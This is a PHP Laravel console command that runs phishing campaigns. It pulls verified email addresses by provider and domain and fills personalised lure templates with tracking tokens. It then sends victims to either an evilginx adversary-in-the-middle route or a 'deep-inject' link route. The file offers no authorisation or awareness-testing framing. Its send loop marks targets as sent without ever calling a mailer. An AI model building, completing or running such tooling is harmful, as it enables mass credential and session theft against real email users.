<?php

namespace App\Console\Commands;

use App\Models\PhishingCampaign;
use App\Models\PhishingTarget;
use App\Models\EmailVerification;
use App\Services\DeepLinkService;
use Illuminate\Console\Command;

class SendPhishingCampaign extends Command
{
    protected $signature = 'phishing:send
        {campaign : Campaign ID or tracking_id}
        {--batch=500 : Emails per batch}
        {--dry-run : Preview without sending}';

    protected $description = 'Dispatch phishing campaign (deeplink injection or evilginx)';

    public function handle(): int
    {
        $input = $this->argument('campaign');
        $campaign = PhishingCampaign::where('id', $input)
            ->orWhere('tracking_id', $input)
            ->first();

        if (!$campaign) {
            $this->error("Campaign not found: {$input}");
            return 1;
        }

        $this->info("Campaign: {$campaign->name} [{$campaign->status}]");
        $this->info("Provider: {$campaign->provider}");
        $this->info("Type: {$campaign->campaign_type}");

        if ($campaign->status !== 'draft' && $campaign->status !== 'paused') {
            $this->error("Campaign must be in 'draft' or 'paused' status to send.");
            return 1;
        }

        $this->loadTargets($campaign);

        $totalTargets = $campaign->targets()->count();
        $pendingCount = $campaign->targets()->where('status', 'pending')->count();
        $this->info("Total targets: {$totalTargets} | Pending: {$pendingCount}");

        if ($pendingCount === 0) {
            $this->warn('No pending targets. Nothing to send.');
            return 0;
        }

        if ($this->option('dry-run')) {
            $this->info('[DRY RUN] Would send ' . $pendingCount . ' emails.');
            $this->table(
                ['Email', 'Domain', 'Token', 'URL'],
                $campaign->targets()->where('status', 'pending')->limit(10)->get(['email', 'domain', 'tracking_token'])->map(function ($t) use ($campaign) {
                    return [
                        'email'   => $t->email,
                        'domain'  => $t->domain,
                        'token'   => $t->tracking_token,
                        'url'     => $this->getUrl($campaign, $t),
                    ];
                })->toArray()
            );
            return 0;
        }

        $campaign->update(['status' => 'active', 'started_at' => now()]);

        $batchSize = (int) $this->option('batch');
        $sent = 0;

        $campaign->targets()->where('status', 'pending')->chunkById($batchSize, function ($targets) use ($campaign, &$sent) {
            foreach ($targets as $target) {
                $phishUrl = $this->getUrl($campaign, $target);
                $trackUrl = route('phish.track', ['token' => $target->tracking_token]);

                $bodyHtml = $this->buildBody($campaign, $target, $phishUrl, $trackUrl);

                $bodyText = $campaign->body_text ?? strip_tags($bodyHtml);
                $bodyText = str_replace('{{PHISH_URL}}', $phishUrl, $bodyText);
                $bodyText = str_replace('{{DEEPLINK_URL}}', $phishUrl, $bodyText);
                $bodyText = str_replace('{{EMAIL}}', $target->email, $bodyText);

                $this->line("  [{$target->id}] {$target->email} => {$phishUrl}");

                $target->update(['status' => 'sent', 'sent_at' => now()]);
                $sent++;
            }
        });

        $campaign->increment('total_sent', $sent);
        $campaign->save();

        $this->info("Sent {$sent} emails.");
        $this->info("Remaining pending: " . $campaign->targets()->where('status', 'pending')->count());

        return 0;
    }

    private function getUrl(PhishingCampaign $campaign, PhishingTarget $target): string
    {
        return match ($campaign->campaign_type) {
            'evilginx' => route('phish.evilginx', [
                'provider' => $campaign->provider,
                'token'    => $target->tracking_token,
            ]),
            default => route('phish.deep-inject', [
                'provider' => $campaign->provider,
                'token'    => $target->tracking_token,
            ]),
        };
    }

    private function buildBody(PhishingCampaign $campaign, PhishingTarget $target, string $phishUrl, string $trackUrl): string
    {
        $body = $campaign->body_html;
        $name = $target->user_display_name ?? explode('@', $target->email)[0];

        $body = str_replace('{{PHISH_URL}}', $phishUrl, $body);
        $body = str_replace('{{DEEPLINK_URL}}', $phishUrl, $body);
        $body = str_replace('{{TRACK_URL}}', $trackUrl, $body);
        $body = str_replace('{{EMAIL}}', $target->email, $body);
        $body = str_replace('{{NAME}}', $name, $body);
        $body = str_replace('{{TRACKING_TOKEN}}', $target->tracking_token, $body);

        return $body;
    }

    private function loadTargets(PhishingCampaign $campaign): void
    {
        $existingCount = $campaign->targets()->count();
        if ($existingCount > 0) {
            $this->info("Found {$existingCount} existing targets, skipping load.");
            return;
        }

        $query = EmailVerification::query()
            ->where('provider', $campaign->provider)
            ->where('status', 'verified');

        $targetDomains = $campaign->target_domains;
        if (!empty($targetDomains) && is_array($targetDomains)) {
            $query->whereIn('domain', $targetDomains);
        }

        $emails = $query->pluck('email', 'domain');

        $this->info("Loading targets for provider: {$campaign->provider}...");
        $bar = $this->output->createProgressBar($emails->count());
        $bar->start();

        $batch = [];
        foreach ($emails as $domain => $email) {
            $name = explode('@', $email)[0];
            $batch[] = [
                'campaign_id'    => $campaign->id,
                'email'          => $email,
                'domain'         => $domain,
                'provider'       => $campaign->provider,
                'user_display_name' => ucfirst($name),
                'status'         => 'pending',
                'tracking_token' => PhishingTarget::generateToken(),
                'created_at'     => now(),
                'updated_at'     => now(),
            ];

            if (count($batch) >= 1000) {
                PhishingTarget::insert($batch);
                $batch = [];
            }
            $bar->advance();
        }

        if (!empty($batch)) {
            PhishingTarget::insert($batch);
        }

        $bar->finish();
        $this->newLine();
        $this->info("Loaded " . $emails->count() . " targets.");
    }
}
